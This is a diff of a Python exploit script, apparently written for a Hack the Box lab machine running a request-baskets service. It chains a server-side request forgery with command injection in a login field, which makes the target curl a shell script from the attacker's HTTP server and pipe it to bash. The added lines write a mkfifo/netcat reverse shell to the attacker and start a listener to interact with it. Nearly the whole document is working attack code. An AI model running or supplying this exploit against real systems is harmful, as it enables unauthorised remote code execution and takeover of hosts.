@@ -1,4 +1,3 @@
-import atexit
 import string
 import random
 import subprocess
@@ -27,7 +26,9 @@ sau_web_service_port = "55555"
 localhost = "127.0.0.1"
 url_vulnerable_service = f"http://{victim}:{sau_web_service_port}/"
 ssrf_url = f"http://{victim}:{sau_web_service_port}/api/baskets/"
-ssrf_payload = f"http://{localhost}:80/"  # According to nmap port 80 is filtered. That means the firewall is blocking por 80. Which means it could be some web service.
+ssrf_payload = f"http://{localhost}:80/"
+# According to nmap port 80 is filtered. That means the firewall is blocking port 80.
+# Which means it could be some web service running only accesible from inside the machine.
 
 range_basket_name = 10
 http_server = None
@@ -54,9 +55,9 @@ def check_vpn_connection(target_ip):
 
     time.sleep(2)
     try:
-        subprocess.run(["ping", "-c", "1", target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["ping", "-c", "1", target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
         p.success("Target [" + target_ip + "] reachable. Connection successfully checked.")
-    except subprocess.CalledProcessError as e:
+    except:
         print("Target [" + target_ip + "] unreachable. Make sure you are connected to Hack the Box VPN.")
         sys.exit(1)
 
@@ -82,20 +83,12 @@ def start_http_server(python_version):
     p.status("poping simple http server")
 
     try:
-        http_server = subprocess.Popen(["python3", "-m", "http.server", "8003"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        http_server = subprocess.Popen(["python3", "-m", "http.server", "8003"], stdout=subprocess.DEVNULL,
+                                       stderr=subprocess.DEVNULL)
         p.success("Server started successfully")
     except subprocess.CalledProcessError as e:
         print("Error a la hora de iniciar el servidor " + e)
         sys.exit(1)
-
-
-def listen_and_interact(nc_port):
-    listener = listen(nc_port, timeout=20).wait_for_connection()
-
-    if listener.sock:
-        print("\n")
-        listener.interactive()
-
 
 
 def get_rce():
@@ -129,77 +122,28 @@ def get_rce():
 
     if r.status_code == 201:
         p.success("Sending the payload to get the RCE")
+        time.sleep(1)
 
         res = requests.request(method="GET", url=url_vulnerable_service + basket_name)
 
         if res.status_code == 200:
+            os.system(f"echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {attacker} {nc_port} >/tmp/f' > rev.sh")
+            os.system("chmod +x rev.sh")
 
-            threading.Thread(target=os.system, args=[f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://{attacker}:8003/rev.sh | bash`'"]).start()
+            threading.Thread(target=os.system, args=[
+                f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://{attacker}:8003/rev.sh | bash`'"]).start()
 
-            # listener = listen(nc_port, timeout=20).wait_for_connection()
-            # Listener en segundo plano
-            listener_thread = threading.Thread(target=listen_and_interact, args=(nc_port,))
-            listener_thread.daemon = True  # El hilo se detendrá cuando el programa principal termine
-            listener_thread.start()
+            listener = listen(nc_port, timeout=20).wait_for_connection()
 
-            # Esperar hasta que el proceso de escucha esté en segundo plano antes de continuar
-            listener_thread.join()
+            if listener.sock:
+                print("\n")
 
-            p.success("RCE success")
+                kill_processes()
+                listener.interactive()
 
-
-    # try:
-            #     # subprocess.Popen(["nc", "-lvnp", str(nc_port)])
-            #     nc_thread = threading.Thread(target=os.system, args=[f"nc -lvnp {nc_port}"])
-            #     nc_thread.start()
-            #     nc_thread.join(timeout=1)
-            # except FileNotFoundError:
-            #     print("Netcat (nc) is not installed or not in the PATH.")
-            #
-            # os.system(f"echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker} {nc_port} >/tmp/f' > rev.sh | chmod +x rev.sh")
-            # attack_thread = threading.Thread(target=os.system, args=[f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://{attacker}:8003/rev.sh | bash`'"])
-            # attack_thread.start()
-
-
-
-            # # Crear el script de reverse shell
-            # rev_shell_script = f"echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker} {nc_port} >/tmp/f' > rev.sh && chmod +x rev.sh"
-            # subprocess.run(rev_shell_script, shell=True)
-            #
-            # # Ejecutar el comando curl para activar el reverse shell
-            # curl_command = f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://{attacker}:8003/rev.sh | bash`'"
-            # subprocess.run(["/bin/bash", "-c", curl_command])
-            #
-            # subprocess.run(["rm", "rev.sh"])
-
-
-# if r.status_code == 201:
-#
-# if r.status_code == 200:
-# print(f"Web service found inside {victim} -> {localhost}:80")
-#
-# nc_thread = threading.Thread(target=os.system, args=[f"nc -lvnp {nc_port}"])
-# nc_thread.start()
-# nc_thread.join(timeout=1)
-#
-# server_thread = threading.Thread(target=os.system, args=[f"python -m http.server 8003"])
-# server_thread.start()
-#
-# time.sleep(1)
-#
-# os.system(f"echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker} {nc_port} >/tmp/f' > rev.sh | chmod +x rev.sh")
-# attack_thread = threading.Thread(target=os.system, args=[f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://{attacker}:8003/rev.sh | bash`'"])
-# attack_thread.start()
-# print("Trying to explote...")
-#
-# attack_thread.join(timeout=10)
-#
-# os.system("kill $(lsof -i :8003 | grep LISTEN | awk '{print $2}')")
-# os.system("rm rev.sh")
 
 if __name__ == '__main__':
     # Program flow control
-    atexit.register(kill_processes)
     signal.signal(signal.SIGINT, exit_handler)
 
     # Check vpn connection - check if the target is available to connect
@@ -211,5 +155,5 @@ if __name__ == '__main__':
     # Start the server
     start_http_server(python_version)
 
-    # start the connection
+    # start the explotation to get remote code execution
     get_rce()
